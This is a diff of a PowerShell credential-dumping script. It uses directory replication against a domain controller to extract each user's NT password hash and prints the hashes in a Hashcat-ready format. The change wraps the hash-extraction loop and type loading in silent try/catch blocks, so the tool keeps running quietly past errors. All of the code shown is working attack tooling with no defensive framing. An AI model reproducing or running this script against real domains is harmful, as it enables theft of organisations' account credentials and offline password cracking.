@@ -1476,7 +1476,8 @@ namespace drsrdotnet
 }
 "@
 
-Add-Type -TypeDefinition $sourceDrsr
+try{Add-Type -TypeDefinition $sourceDrsr}
+catch{}
 
 $ErrorActionPreference = "SilentlyContinue"
 
@@ -1524,12 +1525,14 @@ $drsr.Initialize($DomainController, $Domain)
 foreach($usr in $AllUsers){
 	$usr = $usr.Trim()
 	#Start-Sleep -MilliSeconds 10
-	$values = $drsr.GetData($usr)
-	$hash = $values["ATT_UNICODE_PWD"]
-	$hashprint = -join ($hash|  foreach {$_.ToString("X2") } )
-	if($Hashcat){$FinalLine = $usr + "::" + "aad3b435b51404eeaad3b435b51404ee:" + $hashprint + ":::"}
-	else{$FinalLine = $usr + ":" + $hashprint}
-	Write-Output "$FinalLine"
+ 	try{
+		$values = $drsr.GetData($usr)
+		$hash = $values["ATT_UNICODE_PWD"]
+		$hashprint = -join ($hash|  foreach {$_.ToString("X2") } )
+		if($Hashcat){$FinalLine = $usr + "::" + "aad3b435b51404eeaad3b435b51404ee:" + $hashprint + ":::"}
+		else{$FinalLine = $usr + ":" + $hashprint}
+		Write-Output "$FinalLine"
+  	}catch{}
 }
 }
 
